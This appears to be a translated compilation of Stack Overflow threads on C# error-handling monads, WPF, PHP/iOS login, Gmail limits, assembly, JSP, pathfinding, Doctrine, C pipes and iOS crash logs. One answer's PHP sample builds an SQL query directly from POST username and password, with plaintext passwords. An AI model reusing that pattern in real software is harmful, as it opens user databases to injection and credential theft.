我有一个数据层调用，我想以单子方式返回其结果，例如没有更新的行/数据集等，或者异常。我想我需要使用 Exception monad，我可以将其视为 Either monad 的特例

我查看了各种样本 - 数吨的 Maybe 样本，我不太确定如何或是否将其概括为 Either monad - 但我找不到任何不在 haskell 中的样本 - 不幸的是，我最肯定不要 grok haskell ！

我想知道是否有人可以向我指出任何样品。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2016-01-06T15:23:29.757

我们已经`Either`在我们的 C# 解决方案中实现了数据结构，并且我们很乐意使用它。这是此类实现的最简单版本：

```
public class Either<TL, TR>
{
    private readonly TL left;
    private readonly TR right;
    private readonly bool isLeft;

    public Either(TL left)
    {
        this.left = left;
        this.isLeft = true;
    }

    public Either(TR right)
    {
        this.right = right;
        this.isLeft = false;
    }

    public T Match<T>(Func<TL, T> leftFunc, Func<TR, T> rightFunc)
        => this.isLeft ? leftFunc(this.left) : rightFunc(this.right);

    public static implicit operator Either<TL, TR>(TL left) => new Either<TL, TR>(left);

    public static implicit operator Either<TL, TR>(TR right) => new Either<TL, TR>(right);
} 
```

（我们的代码有更多的辅助方法，但它们是可选的）

要点是

*   您只能设置`Left`或`Right`
*   有隐式运算符使实例化更容易
*   模式匹配有一个 Match 方法

我还描述了[我们如何使用这种 Either 类型进行数据验证](http://mikhail.io/2016/01/validation-with-either-data-type-in-csharp/)。

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2012-06-27T07:33:50.553

在学习一点 C# 中的 monad 时，为了练习，我`Exceptional`为自己实现了一个 monad。使用这个 monad，您可以将可能`Exception`在这两个示例中抛出类似的操作链接起来：

```
var exc1 = from x in 0.ToExceptional()
           from y in Exceptional.Execute(() => 6 / x)
           from z in 7.ToExceptional()
           select x + y + z;
Console.WriteLine("Exceptional Result 1: " + exc1);

var exc2 = Exceptional.From(0)
           .ThenExecute(x => x + 6 / x)
           .ThenExecute(y => y + 7);
Console.WriteLine("Exceptional Result 2: " + exc2); 
```

两个表达式产生相同的结果，只是语法不同。结果将是一个`Exceptional<T>`将出现的`DivideByZeroException`集合作为属性。第一个示例显示了使用 LINQ 的 monad 的“核心”，第二个示例包含不同且可能更易读的语法，它以更易于理解的方式说明了方法链接。

那么，它是如何实现的呢？这是`Exceptional<T>`类型：

```
public class Exceptional<T>
{
    public bool HasException { get; private set; }
    public Exception Exception { get; private set; }
    public T Value { get; private set; }

    public Exceptional(T value)
    {
        HasException = false;
        Value = value;
    }

    public Exceptional(Exception exception)
    {
        HasException = true;
        Exception = exception;
    }

    public Exceptional(Func<T> getValue)
    {
        try
        {
            Value = getValue();
            HasException = false;
        }
        catch (Exception exc)
        {
            Exception = exc;
            HasException = true;
        }
    }

    public override string ToString()
    {
        return (this.HasException ? Exception.GetType().Name : ((Value != null) ? Value.ToString() : "null"));
    }
} 
```

monad 是通过扩展方法`ToExceptional<T>()`和完成`SelectMany<T, U>()`的，对应于 monad 的 Unit 和 Bind 函数：

```
public static class ExceptionalMonadExtensions
{
    public static Exceptional<T> ToExceptional<T>(this T value)
    {
        return new Exceptional<T>(value);
    }

    public static Exceptional<T> ToExceptional<T>(this Func<T> getValue)
    {
        return new Exceptional<T>(getValue);
    }

    public static Exceptional<U> SelectMany<T, U>(this Exceptional<T> value, Func<T, Exceptional<U>> k)
    {
        return (value.HasException)
            ? new Exceptional<U>(value.Exception)
            : k(value.Value);
    }

    public static Exceptional<V> SelectMany<T, U, V>(this Exceptional<T> value, Func<T, Exceptional<U>> k, Func<T, U, V> m)
    {
        return value.SelectMany(t => k(t).SelectMany(u => m(t, u).ToExceptional()));
    }
} 
```

还有一些不属于 monad 核心的小辅助结构：

```
public static class Exceptional
{
    public static Exceptional<T> From<T>(T value)
    {
        return value.ToExceptional();
    }

    public static Exceptional<T> Execute<T>(Func<T> getValue)
    {
        return getValue.ToExceptional();
    }
}

public static class ExceptionalExtensions
{
    public static Exceptional<U> ThenExecute<T, U>(this Exceptional<T> value, Func<T, U> getValue)
    {
        return value.SelectMany(x => Exceptional.Execute(() => getValue(x)));
    }
} 
```

一些解释：只要链中的一个方法抛出异常，就会执行使用此 monad 构建的方法链。在这种情况下，将不再执行链中的任何方法，并且第一个抛出的异常将作为`Exceptional<T>`结果的一部分返回。在这种情况下，将设置`HasException`and属性。`Exception`如果没有`Exception`发生，`HasException`将`false`设置`Value`属性，包含执行的方法链的结果。

请注意，`Exceptional<T>(Func<T> getValue)`构造函数负责异常处理，`SelectMany<T,U>()`方法负责区分之前执行的方法是否引发了异常。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2017-07-22T09:20:56.923

值得注意的是，现在有可用的 C# 库包含以下实现`Either`：

[language-ext](https://github.com/louthy/language-ext)库可用于 .Net 4.5.1 和 .Net Standard 1.3

[LaYumba](https://github.com/la-yumba/functional-csharp-code)库可用于 .Net Standard 1.6 和 .Net Core 1.1。

这两个库都有很好的文档记录，LaYumba 被用作 Manning[的《C#函数式编程](https://www.manning.com/books/functional-programming-in-c-sharp)》一书的基础。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-05-29T06:45:56.540

[所以 - 不知道是否有人感兴趣 - 在Mike Hadlow](http://mikehadlow.blogspot.co.uk/2011/01/monads-in-c1-introduction.html)的带领下，我提出了一个***非常*** ***初步***的实现。其中一些感觉不太正确，但这是一个开始。（话虽如此，我不会使用它 - 你可能会损失一百万美元甚至杀死某人 - 只是我的警告！）

可以编写的代码类型的一个非常简单的示例是

```
var exp = from a in 12.Div(2)
          from b in a.Div(2)
          select a + b;

Assert.AreEqual(9, exp.Value());

var exp = from a in 12.Div(0)
          from b in a.Div(2)
          select b;

Assert.IsTrue(exp.IsException()); 
```

使用 Div 方法实现如下：

```
public static IExceptional<int> Div(this int numerator, int denominator)
{
    return denominator == 0
           ? new DivideByZeroException().ToExceptional<int, DivideByZeroException>()
           : (numerator / denominator).ToExceptional();
} 
```

或者

```
public static IExceptional<int> Div_Throw(this int numerator, int denominator)
{
    try
    {
        return (numerator / denominator).ToExceptional();
    }
    catch (DivideByZeroException e)
    {
        return e.ToExceptional<int, DivideByZeroException>();
    }            
 } 
```

（我马上就可以看到对 api 的潜在改进，但我不确定如何实现它。我认为这

```
new DivideByZeroException().ToExceptional<int, DivideByZeroException>() 
```

如果是的话会更好

```
new DivideByZeroException().ToExceptional<int>() 
```

您稍后会看到我的实现，希望有人能够为上述内容重新设计它。）

monadic 位在这里完成（主要）

```
public static class Exceptional
{
    public static IExceptional<TValue> ToExceptional<TValue>(this TValue result)
    {
        return new Value<TValue>(result);
    }

    public static IExceptional<TValue> ToExceptional<TValue,TException>(this TException exception) where TException : System.Exception
    {
        return new Exception<TValue, TException>(exception);
    }

    public static IExceptional<TResultOut> Bind<TResultIn, TResultOut>(this IExceptional<TResultIn> first, Func<TResultIn, IExceptional<TResultOut>> func)
    {                
        return first.IsException() ? 
                ((IInternalException)first).Copy<TResultOut>() : 
                func(first.Value());
    }

    public static IExceptional<TResultOut> SelectMany<TResultIn, TResultBind, TResultOut>(this IExceptional<TResultIn> first, Func<TResultIn, IExceptional<TResultBind>> func, Func<TResultIn, TResultBind, TResultOut> select)
    {
        return first.Bind(aval => func(aval)
                    .Bind(bval => select(aval, bval)
                    .ToExceptional()));
    }   
} 
```

主界面指定为

```
public interface IExceptional<TValue>
{
    bool IsException();    
    TValue Value();
} 
```

我有一个内部接口，用于处理已抛出的异常（稍后会详细介绍）

```
internal interface IInternalException 
{
    IExceptional<TValue> Copy<TValue>();     
} 
```

具体实现如下：

```
public class Value<TValue> : IExceptional<TValue>
{
    TValue _value = default(TValue);

    public Value(TValue value)
    {
        _value = value;
    }

    bool IExceptional<TValue>.IsException()
    {
        return false;
    }

    TValue IExceptional<TValue>.Value()
    {
        return _value;
    }
}

public class Exception<TValue, TException> : IInternalException, IExceptional<TValue> where TException : System.Exception
{
    TException _exception = default(TException);

    public Exception(TException exception)
    {
        _exception = exception;
    }

    bool IExceptional<TValue>.IsException()
    {
        return true;
    }

    IExceptional<TOutValue> IInternalException.Copy<TOutValue>()
    {
        return _exception.ToExceptional<TOutValue,TException>();
    }

    TException GetException()
    {
        return _exception;
    }

    TValue IExceptional<TValue>.Value()
    {
        return default(TValue);
    }
} 
```

只是一个解释......对我来说，最棘手的一点是出现异常时的 Bind 操作。如果您正在处理操作管道并且在流程的早期抛出异常，则需要将该异常延续到管道中，以便在表达式完成时返回的 IExceptional 包含之前发生的异常。这就是 IInternalException 的原因。它使我能够创建一个相同或（可能不同）类型的新 IExceptional（例如 IExceptional --> IExceptional），但无需知道内部异常的类型即可将异常复制到新的 IExceptional。

毫无疑问，有很多改进是可能的。例如，我可以看到您可能希望跟踪 IExceptional 中的错误堆栈。可能有多余的代码或更好的方法来达到目的……但是……这对我来说是一种学习。

任何想法/建议将不胜感激。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-27T09:06:30.287

C# 对 monad 没有太多支持（并且以 LINQ 形式提供的支持并不真正适用于一般 monad），没有内置的 Exception 或 Either monad。你应该`throw`例外然后`catch`它。

# wpf - 如何使用 Canvas 作为 ItemsPaneltemplate 在项目面板中显示滚动条

> ID：10772729
> 
> 赞同：1
> 
> 时间：2012-05-27T08:40:39.613
> 
> 标签：wpf, xaml

在我的应用程序中，我将 ItemsControl 与 Canvas 作为 ItemsPanelTemplate。itemspanel source的Items是thumb对象，可以拖拽。如果项目退出屏幕视图，我无法滚动查看它们。我想怎么做？我的代码如下：

```
 <ItemsControl ScrollViewer.HorizontalScrollBarVisibility="Visible" ScrollViewer.VerticalScrollBarVisibility="Visible">
                <ItemsControl.ItemContainerStyle>
                    <Style>
                        <Setter Property="Canvas.Left" Value="{Binding XPosition}"/>
                        <Setter Property="Canvas.Top" Value="{Binding YPosition}"/>
                    </Style>
                </ItemsControl.ItemContainerStyle>
                <ItemsControl.ItemsPanel>
                    <ItemsPanelTemplate>
                        <Canvas/>
                    </ItemsPanelTemplate>
                </ItemsControl.ItemsPanel>
            </ItemsControl> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T08:56:42.967

首先，您需要`ItemsControl`用一个包围`ScrollViewer`（与 ListBox 不同，它在其控件模板中包含它）：

```
<ScrollViewer>
    <ItemsControl> ... </ItemsControl>
<ScrollViewer> 
```

其次， a`Canvas`不会在它的孩子之后调整自己的大小。所以你有几个选择：

*   使用带有单个单元格的 Grid 并使用`Margin`属性设置位置。
*   计算最大尺寸并设置画布`Width`和`Height`属性。
*   从 Canvas 继承并覆盖 MeasureOverride 方法，以便它们反映孩子的大小。（见这个[答案](https://stackoverflow.com/a/7115788/276083)。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-09-09T03:27:36.423

我通过设置/更新`Canvas`的`Height`.

# ios - iOS 用户帐户链接到网络帐户

> ID：10772731
> 
> 赞同：0
> 
> 时间：2012-05-27T08:41:06.023
> 
> 标签：ios, database, authentication, login

我正在尝试创建一个应用程序，该应用程序链接到我已经拥有的网站/数据库上的用户信息。所以我托管的 mysql 数据库维护用户名/密码和其他用户相关的信息和偏好。在我的 iphone 应用程序上，我需要连接到此用户数据库以获取用户特定信息并将更多信息发回数据库。

从本质上讲，它有点像你在 instagram iphone 应用程序或 tumblr 应用程序上找到的东西。用户可以从应用程序登录并访问他们现有的博客/照片流，并通过应用程序与网站进行交互。

前进道路上的任何方向都会有巨大的帮助，因为我不知道从哪里开始。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T15:27:24.780

欢迎来到 Stackoverflow。

为了实现您想要做的事情，您需要将用户名+密码从应用程序发布到服务器上的脚本，然后运行 ​​SQL 查询以将数据返回给应用程序。有一个易于使用的库 ASIHTTPRequest (http://allseeing-i.com/ASIHTTPRequest/How-to-use) 将帮助您建立网络。下面的例子..

示例请求：

```
NSURL *url = [NSURL URLWithString:@"http://yourscript.php"];
ASIFormDataRequest *request = [ASIFormDataRequest requestWithURL:url];
[request setPostValue:@"user1" forKey:@"username"];
[request setPostValue:@"pass1" forKey:@"password"];
[request setDelegate:self];
[request startAsynchronous]; 
```

示例响应：

```
- (void)requestFinished:(ASIHTTPRequest *)request {
   NSString *responseString = [request responseString];
   NSLog(@"%@",responseString);
} 
```

在您的 PHP 脚本中：

```
$user = $_POST['username'];
$pass = $_POST['password'];

$sql="SELECT * FROM users  where username='$user' and password='$pass'";

print_r($sql); //Sends response back to the App to requestFinished: method. 
```

这些只是简单的例子，当然你应该考虑mysql注入和错误检查。希望这可以帮助。

# actionscript-3 - Flex：如何在 for 循环中设置标签的文本？

> ID：10772734
> 
> 赞同：0
> 
> 时间：2012-05-27T08:41:33.857
> 
> 标签：actionscript-3, apache-flex

我在数据网格列中有一个标签。我想为标签设置值，以便标签值根据网格中的行数为每一行递增。我写了一个像这样的简单for循环

```
for(i=1;i<=invArrayCol.length;i++)
{
srno.text=""+i;
} 
```

其中 srno 是赋予标签的 id，invArrayCol 是 ArrayCollectionObject，它是网格的数据提供者。它向我显示了这个错误

访问未定义的属性 srno

# php - 来自站点表单结果的 PHP/GMail SMTP 限制

> ID：10772735
> 
> 赞同：1
> 
> 时间：2012-05-27T08:42:27.617
> 
> 标签：php, email, smtp, gmail, limits

我正在使用 gmail 的服务器通过 smtp/php 邮件发送表单结果。每天可以发送多少个结果有限制吗？同样，我不会发送大量电子邮件或任何东西，但是，有成千上万的人会在一周内使用此表单，我需要一种可靠的方式将这些结果发送到用户的电子邮件中。

我已经测试了许多方法，只是在将电子邮件发送到 Gmail 帐户时遇到了问题——它们甚至不会出现在垃圾邮件文件夹中（有时会出现）。使用 smtp.gmail.com 工作顺利。

那么通过 Gmail 从表单发送结果是否有限制，如果有，有没有办法购买更多？我所看到的只是向多个收件人发送大量消息的结果，在这种情况下并非如此。它只需要大约一个星期。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T08:52:28.570

检查这里开始：

[http://www.emailaddressmanager.com/tips/send-email-limit.html](http://www.emailaddressmanager.com/tips/send-email-limit.html)

我发现解决这个问题的唯一可靠方法是通过**测试**：

*   让您的网页在一小时内发送多条消息

*   检查这些电子邮件的结果（我想是[PHPMailer吗？）](http://phpmailer.worxware.com/)

你会发现 gmail 现在使用的当前限制（它不是固定的，当它改变时他们肯定不会告诉你）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T08:53:22.403

您自己的 ISP 可能会阻止电子邮件，因此直接发送到 GMail 服务器似乎是一个可行的选择（如果您的所有收件人都在 GMail 上）。不确定他们是否施加了任何限制，但要确定邮件是否通过垃圾邮件过滤器仍然有点困难。

另一种选择可能是 Amazon SES（付费服务，但它们的价格相对便宜）。他们提供退回/投诉循环，以便您可以检查哪些收件人标记了您的邮件:)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-28T18:55:00.803

Gmail 确实有严格的发送限制。对于 Google Apps 帐户，它是 2000 个/天，并且突增限制也较小 ( [http://support.google.com/a/bin/answer.py?hl=en&answer=166852](http://support.google.com/a/bin/answer.py?hl=en&answer=166852) )。

他们没有发布常规的 Gmail 限制，但有趣的是，外部客户端（例如您的应用程序）每天大约 100 个，Gmail 网络客户端内部每天 500 个。

要发送给单个收件人，您可能正在寻找交易电子邮件服务 - 请参阅此处了解更多讨论：[寻找批量和交易电子邮件发送服务](https://stackoverflow.com/questions/7492425/looking-for-bulk-and-transactional-email-sending-service)

免责声明：我为 PostageApp 工作，在附加的 SO 讨论中提到

# assembly - If 语句对应于程序集 (NASM)？

> ID：10772738
> 
> 赞同：4
> 
> 时间：2012-05-27T08:43:17.197
> 
> 标签：assembly, if-statement, nasm

我正在寻找一个类似于 Java、C 等汇编语言中的 if 语句的命令，我正在使用 NASM。

如果输入数字小于零、大于一百或介于零和一百之间，则希望它分支程序。而且我不知道如何实现这种核对。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T09:16:50.753

谢谢Corbin，我用这个解决了

```
;check if n is between 0 and 100
cmp     eax, [e2]
jg      end_if1
jmp         next

next:
cmp     eax,[e1]
jl      end_if2
jmp         math 
```

您的链接对我帮助很大:) 先生，祝您有愉快的一天！

# java - 将一个 JSP 页面包含到另一个页面中

> ID：10772739
> 
> 赞同：0
> 
> 时间：2012-05-27T08:43:31.663
> 
> 标签：java, xml, xslt, jstl, el

我有一个包含另一个 HTML 页面的 JSP 页面。后者有以下内容：

```
<html>
<body>
<ul>    

<li>
<a href="/TutorWebApp/page/common/login.jsp">${startPage}</a>
</li>            

</ul>
</body>
</html> 
```

此 html 文件是从 xml 转换的结果 xslt

```
<?xml version="1.0" encoding="UTF-8"?>
<testing>
    <menu>
        <menu-item>
            <title>${startPage}</title>
            <url>/TutorWebApp/page/common/login.jsp</url>                        
        </menu-item>
    </menu>
</testing> 
```

并借助样式表

```
<?xml version="1.0" encoding="UTF-8"?>

<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">   

    <xsl:template match="/">
        <html>            
            <body>                
                <ul>
                    <xsl:apply-templates/>
                </ul>
            </body>
        </html>
    </xsl:template>

    <xsl:template match="menu-item">
        <li>
            <a>
                <xsl:attribute name="href">
                    <xsl:value-of select="url"/>
                </xsl:attribute>
                <xsl:value-of select="title"/>
            </a>            
        </li>        
    </xsl:template> 
</xsl:stylesheet> 
```

我通过使用 JSTL 的 c:import 标记来包含 HTML 页面（我使用 jspf -header 和 footer，并且库包含在 header 中）。

```
<fmt:bundle basename="by.epam.testing.resource.content" prefix="content.">
    <fmt:message key="inputinfo" var="InputInfo"/>    
    <fmt:message key="exit" var="Exit"/>   
    <fmt:message key="startPage" var="StartPage"/>
</fmt:bundle>
<div class="left"> 
    <c:if test="${role eq 'Tutor'}">
        <c:import url="/page/menuForTutor.html" charEncoding="UTF-8"/>
    </c:if>

    <c:if test="${role eq 'Student'}">
        <c:import url="/page/menuForStudent.html" charEncoding="UTF-8"/>
    </c:if>    
</div> 
```

问题是我得到以下输出。即不扩展JSP 变量名。 ![截屏](../Images/b0f7bfdea24ae703043997584f38a6f4.png)

有没有办法解决这个问题？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-07-11T16:23:39.467

引用[JB Nizet](https://stackoverflow.com/users/571407/jb-nizet)的评论：

> HTML 文件是静态文件，JSP 编译器不会解释这些文件。
> 
> 您不能在 HTML 文件中使用 JSP EL。
> 
> 此外，另一个 HTML 页面中的完整 HTML 页面是无效的 HTML。

# algorithm - 寻路：跳跃点搜索 - 直线移动与对角线移动

> ID：10772742
> 
> 赞同：3
> 
> 时间：2012-05-27T08:44:04.917
> 
> 标签：algorithm, point, path-finding, a-star

计划开发 2D RTS，我试图了解 Astar 的工作原理。确实，我找到了一些文章，解释了如何将 Astar 与二进制堆结合起来进行优化，以及利用路径对称性的算法，如[Jump Poin Search 算法](http://harablog.wordpress.com/2011/09/07/jump-point-search/)。我尝试[实现](https://github.com/Yonaba/Jumper)Jump Point Search，它运行良好。我什至用 MovingAI 的地图做了一些基准测试。

然而有一个问题。允许对角线移动时一切正常。禁用时，不返回任何路径...

它可能与我实现它的方式有关，然后我都在问...一般来说，您如何要求算法（JPS）搜索仅涉及直线移动（而不是对角线移动）的路径以达到目标？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-09T21:20:32.580

跳转点搜索需要启用对角线才能工作。在状态算法中，这是它的局限性之一。此外，您将无法使您的地形可区分（泥浆 = 对运动的惩罚等），因为这会破坏对称性。我建议你坚持 A* 并尝试通过地形呈现（网格、航点）来获得性能。或者也许检查 HPA*。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-10-15T17:19:24.927

如果您让它沿着垂直于原始方向的方向发送子搜索（就像对角线移动一样），那么应该可以创建一个仅使用基本方向的 JPS 版本。这样做，它将能够找到给定位置的节点何时会找到更前面的节点。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-02-24T06:39:16.563

好吧，从技术上讲，如果不允许对角线移动，那么您的最佳启发式是曼哈顿距离。这意味着 A* 将以最少的动作找到答案。在网格中表示您的地图，每个节点都有一个 onOpen 和 onClosed 布尔值，而不是使用封闭列表，这是一个巨大的优化。另外，如果你使用 std make heap、push_heap 和 pop heap，你可以获得成本 log n (1 to pop + log n to sort = O(logn)) 的最便宜的节点，这比使用向量的伸缩性要好得多。

# php - 教义迭代似乎不稳定

> ID：10772745
> 
> 赞同：1
> 
> 时间：2012-05-27T08:44:42.670
> 
> 标签：php, doctrine-orm

正如我在[另一个问题](https://stackoverflow.com/questions/10756852/doctrine-findby-out-of-memory-error)中发现的那样，使用 Doctrine 将 300k 行作为实体加载不是一个好主意，并且会消耗至少 1 GB 的内存。

因为无论如何我都需要一些按位运算，所以我想我会使用 a`NativeQuery`和`iterate()`结果。但是，在第一行之后，我的值始终为空。[我的代码与文档](http://readthedocs.org/docs/doctrine-orm/en/latest/reference/batch-processing.html#iterating-large-results-for-data-processing)高度相似：

```
$sql = "SELECT `pushToken` FROM `Devices`";
$rsm = new Doctrine\ORM\Query\ResultSetMappingBuilder(self::$entityManager);
$rsm->addScalarResult("pushToken", "pt");
$query = self::$entityManager->createNativeQuery($sql, $rsm);
$iterableDevices = $query->iterate();
foreach ($iterableDevices as $row)
{
    $message->addRecipient($row[0]["pt"]);
} 
```

然而，当我`var_dump`编辑`$row`时，我注意到每次代码运行循环时索引实际上都会增加。这与文档相矛盾。我做错了什么，还是我发现了一个诚实的错误？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2021-04-30T09:31:58.067

我在这里找到了解决方案[将所有子数组合并为一个](https://stackoverflow.com/questions/27304024/merge-all-sub-arrays-into-one)并这样做：

```
$iterator = $this->getEntityManager()->createNativeQuery($sql, $rsm)->iterate();
foreach ($iterator as $row) {
    yield call_user_func_array('array_merge', $row);
} 
```

# c - 通过管道从进程发送到进程的缓冲区大小

> ID：10772747
> 
> 赞同：1
> 
> 时间：2012-05-27T08:46:13.297
> 
> 标签：c, process, pipe

我创建了两个子进程，它们之间有管道连接。

进程A中的代码：

```
char *buf;
size_t size;

buf = "some string";
size = strlen(buf);
printf("size in process A:%zu\n", size);
write(pfds[3][1], &size, sizeof (size_t));
write(pfds[3][1], buf, sizeof (buf));

buf="other string";
size = strlen(buf);
printf("size in process A:%zu\n", size);
write(pfds[3][1], &size, sizeof (size_t));
write(pfds[3][1], buf, sizeof (buf)); 
```

进程B中的代码：

```
size_t size;
/*read in size from Process A*/
read(pfds[3][0], &size, sizeof (size_t));
printf("READ size in process B: %zu\n", size);

/*allocate memory space for the line*/
char *buf = malloc(size);

/*read in line from process A*/
read(pfds[3][0], buf, size);
printf("READ buf in process B: %s.\n", buf);

/*read in size from readProcess*/
read(pfds[3][0], &size, sizeof (size_t));
printf("READ size in process B:%zu\n", size);

/*free the allocated memory*/
free(buf); 
```

输出如下所示：

```
size in process A:11
size in process A:12
READ size in process B: 11
READ buf in process B: some
                            .
READ size in process B:101 
```

我想用大小来控制一个while循环，不断地将行从A发送到B，直到大小变为0。但是我做错了什么？第一次发送时大小正确，但第二次发送时不正确。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-27T08:52:52.373

sizof(buf) 将返回 4，一个指针的大小，你需要的是 strlen(buf) 所以

> 写（pfds[3][1]，buf，sizeof（buf））；

应该

> 写（pfds[3][1]，buf，strlen（buf））；

# ios - 无法象征崩溃日志 - 为什么？

> ID：10772748
> 
> 赞同：1
> 
> 时间：2012-05-27T08:46:22.590
> 
> 标签：ios, xcode

我有一个来自用户的崩溃文件，以及来自应用商店的 xarchive 构建的 DSYM 目录。尽管如此，我没有得到地址到函数名称的翻译。谁能告诉我为什么？

命令行：

```
/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/Library/PrivateFrameworks/DTDeviceKit.framework/Versions/A/Resources/symbolicatecrash TypO\ Lite_2012-05-26-221125_GC-64-4G-iPad.crash TypO\ Lite.app.dSYM 
```

输出：

```
Error: No developer directory found at /Developer. Run /usr/bin/xcode-select to update the developer directory path.
Incident Identifier: 485C4142-0FCF-4F92-A06E-31FFA6FC5F8C
CrashReporter Key:   bf6e22e903e9819111c4d7498eb6006d32f64472
Hardware Model:      iPad3,3
Process:         TypO Lite [1357]
Path:            /var/mobile/Applications/527E2243-2DFB-4934-A9D3-F5C7C13FCBC0/TypO Lite.app/TypO Lite
Identifier:      TypO Lite
Version:         ??? (???)
Code Type:       ARM (Native)
Parent Process:  launchd [1]

Date/Time:       2012-05-26 22:11:25.868 +1000
OS Version:      iPhone OS 5.1.1 (9B206)
Report Version:  104

Exception Type:  EXC_CRASH (SIGABRT)
Exception Codes: 0x00000000, 0x00000000
Crashed Thread:  0

Last Exception Backtrace:
0   CoreFoundation                  0x32de088f 0x32d27000 + 759951
1   libobjc.A.dylib                 0x34d85259 0x34d7c000 + 37465
2   TypO Lite                       0x000f8119 0xe7000 + 69913
3   TypO Lite                       0x000f8725 0xe7000 + 71461
4   TypO Lite                       0x000f018f 0xe7000 + 37263
5   TypO Lite                       0x000f1f33 0xe7000 + 44851
6   TypO Lite                       0x00116453 0xe7000 + 193619
7   TypO Lite                       0x00115d51 0xe7000 + 191825
8   UIKit                           0x3531fcab 0x352e4000 + 244907
9   UIKit                           0x353197dd 0x352e4000 + 219101
10  UIKit                           0x352e7ac3 0x352e4000 + 15043
11  UIKit                           0x352e7567 0x352e4000 + 13671
12  UIKit                           0x352e6f3b 0x352e4000 + 12091
13  GraphicsServices                0x32e8422b 0x32e7f000 + 21035
14  CoreFoundation                  0x32db4523 0x32d27000 + 578851
15  CoreFoundation                  0x32db44c5 0x32d27000 + 578757
16  CoreFoundation                  0x32db3313 0x32d27000 + 574227
17  CoreFoundation                  0x32d364a5 0x32d27000 + 62629
18  CoreFoundation                  0x32d3636d 0x32d27000 + 62317
19  UIKit                           0x3531886b 0x352e4000 + 215147
20  UIKit                           0x35315cd5 0x352e4000 + 203989
21  TypO Lite                       0x000e8343 0xe7000 + 4931
22  TypO Lite                       0x000e8324 0xe7000 + 4900 
```

事实证明我遇到了很多这样的错误......

```
.....fetching symbol file for libc++abi.dylib--[undef] 
Searching [/Users/andersprivat/Library/Developer/Xcode/iOS DeviceSupport/5.1.1 (9B206)/Symbols/usr/lib/libc++abi.dylib]...--[/Users/andersprivat/Library/Developer/Xcode/iOS DeviceSupport/5.1.1 (9B206)/Symbols/usr/lib/libc++abi.dylib] Running xcrun -sdk iphoneos lipo -info '/Users/andersprivat/Library/Developer/Xcode/iOS DeviceSupport/5.1.1 (9B206)/Symbols/usr/lib/libc++abi.dylib'
Error: No developer directory found at /Developer. Run /usr/bin/xcode-select to update the developer directory path.
## /Users/andersprivat/Library/Developer/Xcode/iOS DeviceSupport/5.1.1 (9B206)/Symbols/usr/lib/libc++abi.dylib doesn't contain armv7 slice
-- NO MATCH
Searching in Spotlight for dsym with UUID of bab4dcbfc5943d3fbb637342d35e8045
Running mdfind "com_apple_xcode_dsym_uuids == BAB4DCBF-C594-3D3F-BB63-7342D35E8045"
@dsym_paths = (  )
@exec_names = (  )
Did not find executable for dsym
## Warning: Can't find any unstripped binary that matches version of /usr/lib/libc++abi.dylib 
```

...这是有关实际应用程序的输出。

```
......fetching symbol file for TypO Lite--[undef] 
Searching []...-- NO MATCH
Searching in Spotlight for dsym with UUID of f166deb83d95370dba90daf9745afe82
Running mdfind "com_apple_xcode_dsym_uuids == F166DEB8-3D95-370D-BA90-DAF9745AFE82"
Running mdls -name com_apple_xcode_dsym_paths \/Users\/andersprivat\/Desktop\/TypO\ Lite\.app\.dSYM
@dsym_paths = ( /Users/andersprivat/Desktop/TypO Lite.app.dSYM/Contents/Resources/DWARF/TypO Lite )
@exec_names = ( TypO Lite )
Running mdfind "kMDItemContentType == com.apple.application-bundle && kMDItemFSName == 'TypO Lite.app'"
Running mdfind "kMDItemContentType == public.unix-executable && kMDItemFSName == 'TypO Lite'"
Running xcrun -sdk iphoneos lipo -info '/Users/andersprivat/Library/Application Support/iPhone Simulator/5.1/Applications/AB89FB64-C669-4FA4-9351-F3A9FC5D6709/TypO Lite.app/TypO Lite'
Error: No developer directory found at /Developer. Run /usr/bin/xcode-select to update the developer directory path.
## /Users/andersprivat/Library/Application Support/iPhone Simulator/5.1/Applications/AB89FB64-C669-4FA4-9351-F3A9FC5D6709/TypO Lite.app/TypO Lite doesn't contain armv7 slice
UUID of executable is: f166deb83d95370dba90daf9745afe82
Executable name: /Users/andersprivat/Library/Application Support/iPhone Simulator/5.1/Applications/AB89FB64-C669-4FA4-9351-F3A9FC5D6709/TypO Lite.app/TypO Lite

UUID doesn't match dsym for executable /Users/andersprivat/Library/Application Support/iPhone Simulator/5.1/Applications/AB89FB64-C669-4FA4-9351-F3A9FC5D6709/TypO Lite.app/TypO Lite
Running xcrun -sdk iphoneos lipo -info '/Users/andersprivat/Documents/Builds/Debug-iphonesimulator/TypO Lite.app/TypO Lite'
Error: No developer directory found at /Developer. Run /usr/bin/xcode-select to update the developer directory path.
## /Users/andersprivat/Documents/Builds/Debug-iphonesimulator/TypO Lite.app/TypO Lite doesn't contain armv7 slice
UUID of executable is: f166deb83d95370dba90daf9745afe82
Executable name: /Users/andersprivat/Documents/Builds/Debug-iphonesimulator/TypO Lite.app/TypO Lite

UUID doesn't match dsym for executable /Users/andersprivat/Documents/Builds/Debug-iphonesimulator/TypO Lite.app/TypO Lite
Running xcrun -sdk iphoneos lipo -info '/Users/andersprivat/Documents/Builds/Debug-iphoneos/TypO Lite.app/TypO Lite'
Error: No developer directory found at /Developer. Run /usr/bin/xcode-select to update the developer directory path.
## /Users/andersprivat/Documents/Builds/Debug-iphoneos/TypO Lite.app/TypO Lite doesn't contain armv7 slice
UUID of executable is: f166deb83d95370dba90daf9745afe82
